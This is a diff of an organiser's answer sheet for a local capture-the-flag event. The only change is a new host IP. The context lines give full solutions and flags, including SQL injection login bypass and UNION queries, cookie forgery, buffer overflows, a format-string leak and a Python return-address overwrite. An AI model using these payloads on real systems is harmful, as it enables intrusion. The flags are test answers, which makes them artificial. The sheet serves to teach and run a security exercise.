@@ -6,7 +6,7 @@ CTFd checks flags automatically and they're case-sensitive, so this sheet is for
 
 Each team gets 3 wrong flags per challenge, shared by its members, and a typo counts. After the third, CTFd locks that challenge for the team. To unlock it, delete one of the team's wrong submissions for it in **Admin Panel > Submissions**, then wait a minute before they try again.
 
-The commands use `192.168.68.103`. If your IP has changed, use the new one.
+The commands use `192.168.68.101`. If your IP has changed, use the new one.
 
 ## Ursa Minor (Linux)
 
@@ -25,13 +25,13 @@ Home folders are read-only, so anything that writes a file has to happen in `/tm
 
 ### Pherkad
 
-1. Log in: `ssh pherkad@192.168.68.103 -p 2220`
+1. Log in: `ssh pherkad@192.168.68.101 -p 2220`
 2. List the files with `ls`. You'll see `flag.txt`.
 3. Read it with `cat flag.txt`. That's the flag.
 
 ### Polaris
 
-1. Log in: `ssh polaris@192.168.68.103 -p 2220`
+1. Log in: `ssh polaris@192.168.68.101 -p 2220`
 2. List the files with `ls`. You'll only see `README.txt`.
 3. Read it with `cat README.txt`. It says some things don't show up unless you ask to see all of them.
 4. List everything, including hidden files, with `ls -a`. Now `.north_star` appears.
@@ -39,7 +39,7 @@ Home folders are read-only, so anything that writes a file has to happen in `/tm
 
 ### Yildun
 
-1. Log in: `ssh yildun@192.168.68.103 -p 2220`
+1. Log in: `ssh yildun@192.168.68.101 -p 2220`
 2. List the files with `ls`. You'll only see a folder called `sky`.
 3. Locate the flag with `find ~ -name flag.txt`. It prints `/home/yildun/sky/northern/ursa-minor/yildun/flag.txt`.
 4. Go to that folder with `cd ~/sky/northern/ursa-minor/yildun`.
@@ -51,7 +51,7 @@ To teach `cd` and `ls` instead of `find`, walk down one folder at a time: `sky`,
 
 The challenge says the real record is exactly 1337 bytes and owned by `astronomer`.
 
-1. Log in: `ssh kochab@192.168.68.103 -p 2220`
+1. Log in: `ssh kochab@192.168.68.101 -p 2220`
 2. Count the records with `ls catalog | wc -l`. There are 600.
 3. See why a plain search fails with `grep -h flag: catalog/* | head -3`. Every record has something that looks like a flag.
 4. Filter by size with `find ~/catalog -type f -size 1337c`, where `c` means bytes. That still leaves 25 files.
@@ -64,7 +64,7 @@ Steps 5 and 6 as one command: `grep flag: "$(find ~/catalog -type f -size 1337c 
 
 The challenge says every reading was logged at least twice, except the real flag.
 
-1. Log in: `ssh urodelus@192.168.68.103 -p 2220`
+1. Log in: `ssh urodelus@192.168.68.101 -p 2220`
 2. Look at the format with `head -3 sky.log`. Each line is a time, a sensor and a reading.
 3. See why whole lines can't be compared with `sort sky.log | uniq -u | wc -l`. It prints `4495`, the same as the number of lines in the log, because the time and sensor make every line different.
 4. Keep only the reading with `cut -d' ' -f3 sky.log | head -3`. `awk '{print $3}' sky.log` works in place of `cut`.
@@ -74,7 +74,7 @@ The challenge says every reading was logged at least twice, except the real flag
 
 The layers are Base64, gzip, tar and gzip. Before each unwrap, run `file` to see what the current layer is.
 
-1. Log in: `ssh akhfa@192.168.68.103 -p 2220`
+1. Log in: `ssh akhfa@192.168.68.101 -p 2220`
 2. Make a private folder and go into it with `cd "$(mktemp -d)"`. Every team shares this login, so a fixed name like `/tmp/akhfa` could collide with theirs.
 3. Copy the file in with `cp ~/signal.dat .`
 4. Undo the Base64:
@@ -134,23 +134,23 @@ All of it as one command: `base64 -d ~/signal.dat | gunzip | tar -xO | gunzip`
 | Alnilam | ★★ Medium | 60 | `:8085` | `STARS{4ln1l4m_c00k13s_c4n_l13}` |
 | Alnitak | ★★★ Hard | 100 | `:8086` | `STARS{4ln1t4k_un10n_s3l3ct_w1ns}` |
 
-Open each address in a browser. The `:8082` means `http://192.168.68.103:8082`.
+Open each address in a browser. The `:8082` means `http://192.168.68.101:8082`.
 
 ### Betelgeuse
 
-1. Open `http://192.168.68.103:8082`.
+1. Open `http://192.168.68.101:8082`.
 2. Right-click the page and choose **View page source** (or press Ctrl+U).
 3. Read down to the staff note in an HTML comment (a line starting `<!--`). The flag is the archive key inside it.
 
 ### Bellatrix
 
-1. Open `http://192.168.68.103:8083`.
-2. Add `/robots.txt` to the address: `http://192.168.68.103:8083/robots.txt`. It lists one disallowed page, `/captains-log/`.
-3. Open that page: `http://192.168.68.103:8083/captains-log/`. The flag is on it.
+1. Open `http://192.168.68.101:8083`.
+2. Add `/robots.txt` to the address: `http://192.168.68.101:8083/robots.txt`. It lists one disallowed page, `/captains-log/`.
+3. Open that page: `http://192.168.68.101:8083/captains-log/`. The flag is on it.
 
 ### Mintaka
 
-1. Open `http://192.168.68.103:8084`.
+1. Open `http://192.168.68.101:8084`.
 2. Right-click and choose **View page source**. The check runs in the browser, so the code is in the page.
 3. Read the `<script>` section. It compares your input against the access code `orions-belt-1`.
 4. Type `orions-belt-1` into the access code box and submit. The vault opens and shows the flag.
@@ -159,7 +159,7 @@ Open each address in a browser. The `:8082` means `http://192.168.68.103:8082`.
 
 The login builds its database query by pasting your text straight in, so your input can change what the query means. The key only shows for the director, whose clearance is 9.
 
-1. Open `http://192.168.68.103:8081`.
+1. Open `http://192.168.68.101:8081`.
 2. In the **username** box, enter `director' -- ` (with a trailing space after `--`). Put anything in the password box.
 3. Submit. You're signed in as the director, and the dashboard shows the telescope key.
 
@@ -169,7 +169,7 @@ Notes: the `-- ` comments out the rest of the query, including the password chec
 
 The site decides your role from a cookie it set, and you can edit your own cookies.
 
-1. Open `http://192.168.68.103:8085`. It shows you signed in as `visitor`.
+1. Open `http://192.168.68.101:8085`. It shows you signed in as `visitor`.
 2. Press F12 to open developer tools. Under **Application** (Chrome/Edge) or **Storage** (Firefox), find Cookies and the cookie named `pass`.
 3. Its value is Base64 of `role=visitor`. Replace the whole value with `cm9sZT1hc3Ryb25vbWVy`, which is Base64 of `role=astronomer`.
 4. Refresh the page. The dome opens and shows the flag.
@@ -178,7 +178,7 @@ The site decides your role from a cookie it set, and you can edit your own cooki
 
 Same injection as Rigel, but there's no login to bypass. The flag is in another table whose name you have to discover first. The search shows 3 columns, so each injected query returns 3 values.
 
-1. Open `http://192.168.68.103:8086`.
+1. Open `http://192.168.68.101:8086`.
 2. In the search box, enter the first query to list the tables and their definitions (trailing space after `--`):
    ```text
    ' UNION SELECT name, sql, 0 FROM sqlite_master --
@@ -360,13 +360,13 @@ Steganography: the flag is hidden one bit at a time in the red channel. This is 
 | Acrab | ★★ Medium | 60 | `STARS{4cr4b_f0rm4t_str1ng_l34k}` |
 | Antares | ★★★ Hard | 100 | `STARS{4nt4r3s_w3nt_sup3rn0v4}` |
 
-For Shaula through Acrab, connect with `ssh <star>@192.168.68.103 -p 2220` and the password `scorpius`; the login drops straight into the program. On a computer that has `nc`, you can instead connect to the matching port: Shaula 9002, Sargas 9003, Lesath 9004, Dschubba 9005, Acrab 9006. Antares needs raw bytes and is handled separately below. I ran all six against the live services and each returned its flag.
+For Shaula through Acrab, connect with `ssh <star>@192.168.68.101 -p 2220` and the password `scorpius`; the login drops straight into the program. On a computer that has `nc`, you can instead connect to the matching port: Shaula 9002, Sargas 9003, Lesath 9004, Dschubba 9005, Acrab 9006. Antares needs raw bytes and is handled separately below. I ran all six against the live services and each returned its flag.
 
 ### Shaula
 
 The menu shows three options, but the source has a hidden fourth case.
 
-1. Connect: `ssh shaula@192.168.68.103 -p 2220`, password `scorpius`.
+1. Connect: `ssh shaula@192.168.68.101 -p 2220`, password `scorpius`.
 2. At the `>` prompt, type `42` and press Enter.
 3. It prints the flag.
 
@@ -374,7 +374,7 @@ The menu shows three options, but the source has a hidden fourth case.
 
 The flag costs 1000 credits and you have 100. The shop checks you can afford a purchase but doesn't stop you buying a negative quantity, which refunds credits.
 
-1. Connect: `ssh sargas@192.168.68.103 -p 2220`, password `scorpius`.
+1. Connect: `ssh sargas@192.168.68.101 -p 2220`, password `scorpius`.
 2. Choose `1` (buy maps). When asked how many, enter `-100`. That costs `-1000`, so your credits rise from 100 to 1100.
 3. Choose `2` (buy the flag). You can now afford it, and it prints the flag.
 
@@ -382,7 +382,7 @@ The flag costs 1000 credits and you have 100. The shop checks you can afford a p
 
 The name tag holds 16 characters, and the "are you an astronomer" flag sits right after it in memory. A long enough name overflows into it.
 
-1. Connect: `ssh lesath@192.168.68.103 -p 2220`, password `scorpius`.
+1. Connect: `ssh lesath@192.168.68.101 -p 2220`, password `scorpius`.
 2. When asked for your name, type 17 or more characters (e.g. `AAAAAAAAAAAAAAAAA`) and press Enter.
 3. The overflow sets the astronomer value to non-zero, and the program prints the flag.
 
@@ -390,7 +390,7 @@ The name tag holds 16 characters, and the "are you an astronomer" flag sits righ
 
 Same idea as Lesath, but the overflow has to land one exact 4-byte value in `key`. From the struct, `name` is 32 bytes and `visits` is 4, so `key` begins 36 bytes in. It must equal `0x41564f4e`, which in little-endian byte order is the text `NOVA`.
 
-1. Connect: `ssh dschubba@192.168.68.103 -p 2220`, password `scorpius`.
+1. Connect: `ssh dschubba@192.168.68.101 -p 2220`, password `scorpius`.
 2. When asked for your name, enter exactly 36 characters followed by `NOVA`:
    ```text
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANOVA
@@ -401,7 +401,7 @@ Same idea as Lesath, but the overflow has to land one exact 4-byte value in `key
 
 The program passes your input straight to `printf`, so format codes like `%s` read from memory. The flag is on the stack, at argument position 31.
 
-1. Connect: `ssh acrab@192.168.68.103 -p 2220`, password `scorpius`.
+1. Connect: `ssh acrab@192.168.68.101 -p 2220`, password `scorpius`.
 2. At the `Callsign:` prompt, enter `%31$s` and press Enter.
 3. It prints the flag on the `Transmitting:` line.
 
@@ -422,7 +422,7 @@ The address is currently `0x4017c5`. **Read it live each time** from the program
 - **From your own computer with Python** (reads the address automatically, so it survives a rebuild):
   ```python
   import socket, re, struct
-  s = socket.create_connection(("192.168.68.103", 9001))
+  s = socket.create_connection(("192.168.68.101", 9001))
   banner = s.recv(4096).decode(errors="replace")
   addr = int(re.search(r"supernova\(\) is at (0x[0-9a-fA-F]+)", banner).group(1), 16)
   s.sendall(b"A" * 72 + struct.pack("<Q", addr))
